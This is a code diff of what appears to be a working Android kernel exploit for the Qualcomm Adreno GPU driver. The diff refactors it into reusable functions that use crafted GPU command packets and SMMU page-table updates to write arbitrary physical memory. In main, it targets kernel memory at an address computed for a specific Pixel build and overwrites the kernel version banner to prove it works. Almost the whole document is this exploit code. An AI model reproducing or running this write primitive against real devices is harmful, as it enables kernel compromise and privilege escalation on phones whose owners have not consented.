@@ -175,7 +175,7 @@ int setup_pagetables(uint8_t *tt0, uint32_t pages, uint32_t tt0phys, uint64_t fa
     return 0;
 }
 
-#define DUMP_PAGEMAP
+// #define DUMP_PAGEMAP
 #ifdef DUMP_PAGEMAP
 // https://github.com/NEWBEE108/linux_kernel_module_Info/blob/master/kernel_module/user/pagemap_dump.c
 // https://github.com/torvalds/linux/blob/master/Documentation/admin-guide/mm/pagemap.rst
@@ -200,7 +200,80 @@ uint64_t GetPhys(int pagemap_fd, uint64_t virt) {
 #define CP_SMMU_TABLE_UPDATE 0x53
 #define CP_CONTEXT_SWITCH_YIELD 0x6b
 
-int main() {
+struct cheese_gpu_rw {
+    int fd;
+    uint32_t ctx_id;
+
+    uint32_t* payload_buf;
+    uint64_t payload_gpuaddr;
+    uint32_t* output_buf;
+    uint64_t output_gpuaddr;
+
+    void* target_physical_page;
+    void* target_pbuf;
+
+    uint64_t phyaddr;
+
+    void* garbage;
+};
+
+const uint64_t kFakeGpuAddr = 0x40403000;
+const uint64_t kGarbageSize = 16 * 1024 * 1024;
+
+static int DoWrite(int fd, int ctx_id, uint32_t* payload_buf, uint64_t payload_gpuaddr, uint64_t phyaddr, uint64_t completion_marker_write_addr, uint64_t write_addr, uint32_t count, uint32_t* values) {
+    uint32_t* drawstate_buf = payload_buf + 0x100;
+    uint64_t drawstate_gpuaddr = payload_gpuaddr + 0x100*sizeof(uint32_t);
+    uint32_t* drawstate_cmds = drawstate_buf;
+    *drawstate_cmds++ = cp_type7_packet(CP_SMMU_TABLE_UPDATE, 4);
+    drawstate_cmds += cp_gpuaddr(drawstate_cmds, phyaddr);
+    *drawstate_cmds++ = 0;
+    *drawstate_cmds++ = 0;
+    drawstate_cmds += cp_wait_for_me(drawstate_cmds);
+    drawstate_cmds += cp_wait_for_idle(drawstate_cmds);
+    *drawstate_cmds++ = cp_type7_packet(CP_MEM_WRITE, 2 + count);
+    drawstate_cmds += cp_gpuaddr(drawstate_cmds, write_addr);
+    for (int i = 0; i < count; i++) {
+        *drawstate_cmds++ = values[i];
+    }
+    *drawstate_cmds++ = cp_type7_packet(CP_MEM_WRITE, 3);
+    drawstate_cmds += cp_gpuaddr(drawstate_cmds, completion_marker_write_addr);
+    *drawstate_cmds++ = 0x41414141;
+
+    uint32_t* payload_cmds = payload_buf;
+    // https://cs.android.com/android/platform/superproject/main/+/main:external/mesa3d/src/freedreno/registers/adreno/adreno_pm4.xml;l=527;drc=2038d363e7e733c0fc04dc123574cbd8b62b9a6e
+    // This causes all drawstates to run immediately - see CP_SET_DRAW_STATE handler's disassembly
+    *payload_cmds++ = cp_type7_packet(CP_SET_MODE, 1);
+    *payload_cmds++ = 1;
+    *payload_cmds++ = cp_type7_packet(CP_SET_DRAW_STATE, 3);
+    // https://cs.android.com/android/platform/superproject/main/+/main:external/mesa3d/src/freedreno/registers/adreno/adreno_pm4.xml;l=1089;drc=2038d363e7e733c0fc04dc123574cbd8b62b9a6e
+    *payload_cmds++ = (drawstate_cmds - drawstate_buf) | ((DRAW_STATE_MODE_BINNING | DRAW_STATE_MODE_GMEM | DRAW_STATE_MODE_BYPASS) << 20);
+    payload_cmds += cp_gpuaddr(payload_cmds, drawstate_gpuaddr);
+
+    uint32_t cmd_size = (payload_cmds - payload_buf) * sizeof(uint32_t);
+
+#if 1
+    fprintf(stderr, "running commands: %x %lx %x\n", ctx_id, payload_gpuaddr, cmd_size);
+    for (int i = 0; i < cmd_size / sizeof(uint32_t); i++) {
+        fprintf(stderr, "%x ", payload_buf[i]);
+    }
+    fprintf(stderr, "\n");
+    for (int i = 0; i < drawstate_cmds - drawstate_buf; i++) {
+        fprintf(stderr, "%x ", drawstate_buf[i]);
+    }
+    fprintf(stderr, "\n");
+#endif
+    usleep(100000);
+    // we don't need Adrenaline's multiple IB stuff - we just use it to run one IB
+    // see https://github.com/github/securitylab/blob/105618fc1fa83c08f4446749e64310b539cb0262/SecurityExploits/Android/Qualcomm/CVE_2022_25664/adreno_kernel/adreno_kernel.c#L188
+    int err = kgsl_gpu_command_payload(fd, ctx_id, /*gpuaddr=*/0, /*cmd_size=*/0, /*n=*/1, /*target_idx=*/0, payload_gpuaddr, cmd_size);
+    if (err) {
+        fprintf(stderr, "Can't run payload: %s\n", strerror(err));
+        return 1;
+    }
+    return 0;
+}
+
+int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
 #ifdef DUMP_PAGEMAP
     int pagemap_fd = getuid() == 0? open("/proc/self/pagemap", O_RDONLY): -1;
 #endif
@@ -234,7 +307,7 @@ int main() {
          * a fixed physical address that you can calculate by taking the base of "Kernel Code"
          * from /proc/iomem and then adding (sys_call_table - _text) from /proc/kallsyms */
         // zhuowei: actually, try to write to itself, please...
-        int ret = setup_pagetables(pbuf, pbuf_len/4096, phyaddr, 0x40403000, phyaddr);
+        int ret = setup_pagetables(pbuf, pbuf_len/4096, phyaddr, kFakeGpuAddr, phyaddr);
 
         if (ret == -1) {
             fprintf(stderr, "setup_pagetables failed\n");
@@ -296,111 +369,18 @@ int main() {
         return 1;
     }
 
+    void* garbage = malloc(kGarbageSize);
+    // really stupid cache flush:
+    memset(garbage, 0x1, kGarbageSize);
+
     // Sign of life: just ask the GPU to write something...
-
-    uint32_t* drawstate_buf = payload_buf + 0x100;
-    uint64_t drawstate_gpuaddr = payload_gpuaddr + 0x100*sizeof(uint32_t);
-    uint32_t* drawstate_cmds = drawstate_buf;
-    *drawstate_cmds++ = cp_type7_packet(CP_SMMU_TABLE_UPDATE, 4);
-    drawstate_cmds += cp_gpuaddr(drawstate_cmds, phyaddr);
-    *drawstate_cmds++ = 0;
-    *drawstate_cmds++ = 0;
-    drawstate_cmds += cp_wait_for_me(drawstate_cmds);
-    drawstate_cmds += cp_wait_for_idle(drawstate_cmds);
-    *drawstate_cmds++ = cp_type7_packet(CP_MEM_WRITE, 3);
-    drawstate_cmds += cp_gpuaddr(drawstate_cmds, 0x40403100);
-    *drawstate_cmds++ = 0x41414141;
-
-    uint32_t* payload_cmds = payload_buf;
-#if 1
-    // https://cs.android.com/android/platform/superproject/main/+/main:external/mesa3d/src/freedreno/registers/adreno/adreno_pm4.xml;l=527;drc=2038d363e7e733c0fc04dc123574cbd8b62b9a6e
-    // This causes all drawstates to run immediately - see CP_SET_DRAW_STATE handler's disassembly
-    *payload_cmds++ = cp_type7_packet(CP_SET_MODE, 1);
-    *payload_cmds++ = 1;
-#endif
-#if 1
-    *payload_cmds++ = cp_type7_packet(CP_SET_DRAW_STATE, 3);
-    // https://cs.android.com/android/platform/superproject/main/+/main:external/mesa3d/src/freedreno/registers/adreno/adreno_pm4.xml;l=1089;drc=2038d363e7e733c0fc04dc123574cbd8b62b9a6e
-    *payload_cmds++ = (drawstate_cmds - drawstate_buf) | ((DRAW_STATE_MODE_BINNING | DRAW_STATE_MODE_GMEM | DRAW_STATE_MODE_BYPASS) << 20);
-    payload_cmds += cp_gpuaddr(payload_cmds, drawstate_gpuaddr);
-#endif
-#if 0
-    *payload_cmds++ = cp_type7_packet(CP_INDIRECT_BUFFER, 3);
-    payload_cmds += cp_gpuaddr(payload_cmds, drawstate_gpuaddr);
-    *payload_cmds++ = (drawstate_cmds - drawstate_buf);
-#endif
-#if 0
-    *payload_cmds++ = cp_type7_packet(CP_SMMU_TABLE_UPDATE, 4);
-    payload_cmds += cp_gpuaddr(payload_cmds, phyaddr);
-    *payload_cmds++ = 0;
-    *payload_cmds++ = 0;
-    payload_cmds += cp_wait_for_me(payload_cmds);
-    payload_cmds += cp_wait_for_idle(payload_cmds);
-#endif
-#if 0
-    *payload_cmds++ = cp_type7_packet(CP_CONTEXT_SWITCH_YIELD, 4);
-    payload_cmds += cp_gpuaddr(payload_cmds, 0); // no
-    *payload_cmds++ = 0;
-    *payload_cmds++ = 0;
-    // would this exit the thing?
-    *payload_cmds++ = cp_type7_packet(CP_SMMU_TABLE_UPDATE, 4);
-    payload_cmds += cp_gpuaddr(payload_cmds, 0x1234567842424242);
-    *payload_cmds++ = 0;
-    *payload_cmds++ = 0;
-    payload_cmds += cp_wait_for_me(payload_cmds);
-    payload_cmds += cp_wait_for_idle(payload_cmds);
-    *payload_cmds++ = cp_type7_packet(CP_SMMU_TABLE_UPDATE, 4);
-    payload_cmds += cp_gpuaddr(payload_cmds, 0x1234567843434343);
-    *payload_cmds++ = 0;
-    *payload_cmds++ = 0;
-    payload_cmds += cp_wait_for_me(payload_cmds);
-    payload_cmds += cp_wait_for_idle(payload_cmds);
-    *payload_cmds++ = cp_type7_packet(CP_SMMU_TABLE_UPDATE, 4);
-    payload_cmds += cp_gpuaddr(payload_cmds, 0x1234567844444444);
-    *payload_cmds++ = 0;
-    *payload_cmds++ = 0;
-    payload_cmds += cp_wait_for_me(payload_cmds);
-    payload_cmds += cp_wait_for_idle(payload_cmds);
-#endif
-#if 0
-// let's see how long this lives for...
-    *payload_cmds++ = cp_type7_packet(CP_MEM_WRITE, 3);
-    payload_cmds += cp_gpuaddr(payload_cmds, output_gpuaddr);
-    *payload_cmds++ = 0x41414141;
-    *payload_cmds++ = cp_type7_packet(CP_MEM_WRITE, 3);
-    payload_cmds += cp_gpuaddr(payload_cmds, output_gpuaddr);
-    *payload_cmds++ = 0x42424242;
-    *payload_cmds++ = cp_type7_packet(CP_MEM_WRITE, 3);
-    payload_cmds += cp_gpuaddr(payload_cmds, output_gpuaddr);
-    *payload_cmds++ = 0x43434343;
-    *payload_cmds++ = cp_type7_packet(CP_MEM_WRITE, 3);
-    payload_cmds += cp_gpuaddr(payload_cmds, output_gpuaddr);
-    *payload_cmds++ = 0x44444444;
-#endif
-#if 0
-    *payload_cmds++ = cp_type7_packet(CP_MEM_WRITE, 3);
-    payload_cmds += cp_gpuaddr(payload_cmds, 0x40403100);
-    *payload_cmds++ = 0x41414141;
-#endif
-
-    uint32_t cmd_size = (payload_cmds - payload_buf) * sizeof(uint32_t);
-
-    sleep(1);
-    printf("running commands: %x %lx %x\n", ctx_id, payload_gpuaddr, cmd_size);
-    for (int i = 0; i < cmd_size / sizeof(uint32_t); i++) {
-        printf("%x ", payload_buf[i]);
-    }
-    printf("\n");
-    // we don't need Adrenaline's multiple IB stuff - we just use it to run one IB
-    // see https://github.com/github/securitylab/blob/105618fc1fa83c08f4446749e64310b539cb0262/SecurityExploits/Android/Qualcomm/CVE_2022_25664/adreno_kernel/adreno_kernel.c#L188
-    err = kgsl_gpu_command_payload(fd, ctx_id, /*gpuaddr=*/0, /*cmd_size=*/0, /*n=*/1, /*target_idx=*/0, payload_gpuaddr, cmd_size);
-    if (err) {
-        fprintf(stderr, "Can't run payload: %s\n", strerror(err));
+    uint32_t test_write = 0x42424242;
+    if (DoWrite(fd, ctx_id, payload_buf, payload_gpuaddr, phyaddr, kFakeGpuAddr + 0x1100, kFakeGpuAddr + 0x200, 1, &test_write)) {
+        fprintf(stderr, "Can't do initial write\n");
         return 1;
     }
-
     sleep(1);
-    fprintf(stderr, "%x %x\n", output_buf[0], output_buf[1]);
+    memset(garbage, 0x1, kGarbageSize);
 
     void* target_physical_page = NULL;
     int target_pbuf = -1;
@@ -433,11 +413,61 @@ int main() {
         pbufs[i] = NULL;
     }
 
-    // TODO(zhuowei): refactor out into function...
+    cheese->fd = fd;
+    cheese->ctx_id = ctx_id;
+    cheese->payload_buf = payload_buf;
+    cheese->payload_gpuaddr = payload_gpuaddr;
+    cheese->output_buf = output_buf;
+    cheese->output_gpuaddr = output_gpuaddr;
+    cheese->target_physical_page = target_physical_page;
+    cheese->target_pbuf = pbufs[target_pbuf];
+    cheese->phyaddr = phyaddr;
+    cheese->garbage = garbage;
+    return 0;
+}
 
-    uint64_t garbage_size = 16*1024*1024;
-    void* garbage = malloc(garbage_size);
+int cheese_physwrite(struct cheese_gpu_rw* cheese, uint64_t target_write_physical_address, uint32_t count, uint32_t* values) {
+    if (setup_pagetables(cheese->target_physical_page, 1, cheese->phyaddr, kFakeGpuAddr, target_write_physical_address & ~0xfffull)) {
+        return 1;
+    }
+    // really stupid cache flush:
+    memset(cheese->garbage, 0x1, kGarbageSize);
+    if (DoWrite(cheese->fd, cheese->ctx_id, cheese->payload_buf, cheese->payload_gpuaddr, cheese->phyaddr, kFakeGpuAddr + 0x1100, kFakeGpuAddr + (target_write_physical_address & 0xfffull), count, values)) {
+        return 1;
+    }
+    usleep(100000);
+    memset(cheese->garbage, 0x1, kGarbageSize);
+    volatile uint32_t* target_marker = cheese->target_physical_page + 0x100;
+    for (int i = 0; i < 20; i++) {
+        fprintf(stderr, "%x\n", target_marker[0]);
+        if (target_marker[0] == 0x41414141) {
+            return 0;
+        }
+        fprintf(stderr, "still waiting: %d\n", i);
+        usleep(100000);
+        memset(cheese->garbage, 0x1, kGarbageSize);
+    }
+    return 1;
+}
 
+int cheese_shutdown(struct cheese_gpu_rw* cheese) {
+    int err = kgsl_ctx_destroy(cheese->fd, cheese->ctx_id);
+    if (err) {
+        fprintf(stderr, "Can't destroy context: %s\n", strerror(err));
+        return 1;
+    }
+
+    close(cheese->fd);
+    return 0;
+}
+
+int main() {
+    struct cheese_gpu_rw cheese = {};
+    if (cheese_gpu_rw_setup(&cheese)) {
+        fprintf(stderr, "can't get GPU r/w\n");
+        return 1;
+    }
+    // crosshatch-rq1a.201205.003.a1
     // /proc/iomem:
     // 80080000-823fffff : Kernel code
     // 82c00000-83885fff : Kernel data
@@ -445,86 +475,13 @@ int main() {
     // ffffff80acbaa017 r linux_proc_banner
     // ffffff80aac80000 T _text
     uint64_t target_write_physical_address = 0x80080000ull + (0xffffff80acbaa018ull - 0xffffff80aac80000ull);
-
-    setup_pagetables(target_physical_page, 1, phyaddr, 0x40403000, target_write_physical_address & ~0xfffull);
-
-    // TODO(zhuowei): this needs to be refactored...
-    drawstate_cmds = drawstate_buf;
-#if 1
-    *drawstate_cmds++ = cp_type7_packet(CP_SMMU_TABLE_UPDATE, 4);
-    drawstate_cmds += cp_gpuaddr(drawstate_cmds, phyaddr);
-    *drawstate_cmds++ = 0;
-    *drawstate_cmds++ = 0;
-    drawstate_cmds += cp_wait_for_me(drawstate_cmds);
-    drawstate_cmds += cp_wait_for_idle(drawstate_cmds);
-#endif
-#if 1
-    *drawstate_cmds++ = cp_type7_packet(CP_MEM_WRITE, 3);
-    drawstate_cmds += cp_gpuaddr(drawstate_cmds, 0x40403000 + (target_write_physical_address & 0xfffull));
-    *drawstate_cmds++ = 'p';
-#endif
-#if 1
-    *drawstate_cmds++ = cp_type7_packet(CP_MEM_WRITE, 3);
-    drawstate_cmds += cp_gpuaddr(drawstate_cmds, 0x40404100);
-    *drawstate_cmds++ = 0x41414141;
-#endif
-#if 0
-    *drawstate_cmds++ = cp_type7_packet(CP_MEM_WRITE, 3);
-    drawstate_cmds += cp_gpuaddr(payload_cmds, output_gpuaddr);
-    *drawstate_cmds++ = 0x41414141;
-#endif
-
-    payload_cmds = payload_buf;
-#if 1
-    // https://cs.android.com/android/platform/superproject/main/+/main:external/mesa3d/src/freedreno/registers/adreno/adreno_pm4.xml;l=527;drc=2038d363e7e733c0fc04dc123574cbd8b62b9a6e
-    // This causes all drawstates to run immediately - see CP_SET_DRAW_STATE handler's disassembly
-    *payload_cmds++ = cp_type7_packet(CP_SET_MODE, 1);
-    *payload_cmds++ = 1;
-#endif
-#if 1
-    *payload_cmds++ = cp_type7_packet(CP_SET_DRAW_STATE, 3);
-    // https://cs.android.com/android/platform/superproject/main/+/main:external/mesa3d/src/freedreno/registers/adreno/adreno_pm4.xml;l=1089;drc=2038d363e7e733c0fc04dc123574cbd8b62b9a6e
-    *payload_cmds++ = (drawstate_cmds - drawstate_buf) | ((DRAW_STATE_MODE_BINNING | DRAW_STATE_MODE_GMEM | DRAW_STATE_MODE_BYPASS) << 20);
-    payload_cmds += cp_gpuaddr(payload_cmds, drawstate_gpuaddr);
-#endif
-#if 0
-    *payload_cmds++ = cp_type7_packet(CP_MEM_WRITE, 3);
-    payload_cmds += cp_gpuaddr(payload_cmds, output_gpuaddr);
-    *payload_cmds++ = 0x42424242;
-#endif
-
-    cmd_size = (payload_cmds - payload_buf) * sizeof(uint32_t);
-
-    volatile uint32_t* target_marker = target_physical_page + 0x100;
-    fprintf(stderr, "here: %x\n", target_marker[0]);
-    // stupid cache flush+invalidate:
-    memset(garbage, 0x1, garbage_size);
-
-    sleep(1);
-    printf("running commands: %x %lx %x\n", ctx_id, payload_gpuaddr, cmd_size);
-    for (int i = 0; i < cmd_size / sizeof(uint32_t); i++) {
-        printf("%x ", payload_buf[i]);
-    }
-    printf("\n");
-    // we don't need Adrenaline's multiple IB stuff - we just use it to run one IB
-    // see https://github.com/github/securitylab/blob/105618fc1fa83c08f4446749e64310b539cb0262/SecurityExploits/Android/Qualcomm/CVE_2022_25664/adreno_kernel/adreno_kernel.c#L188
-    err = kgsl_gpu_command_payload(fd, ctx_id, /*gpuaddr=*/0, /*cmd_size=*/0, /*n=*/1, /*target_idx=*/0, payload_gpuaddr, cmd_size);
-    if (err) {
-        fprintf(stderr, "Can't run payload: %s\n", strerror(err));
+    //               01234567
+    char value[8] = "p Hey1";
+    if (cheese_physwrite(&cheese, target_write_physical_address, 2, (uint32_t*)value)) {
+        fprintf(stderr, "can't write\n");
         return 1;
     }
-
     sleep(1);
-    memset(garbage, 0x1, garbage_size);
-
-    fprintf(stderr, "reread: %x\n", target_marker[0]);
-
-    err = kgsl_ctx_destroy(fd, ctx_id);
-    if (err) {
-        fprintf(stderr, "Can't destroy context: %s\n", strerror(err));
-        return 1;
-    }
-
-    close(fd);
+    // now check /proc/version
     return 0;
 }
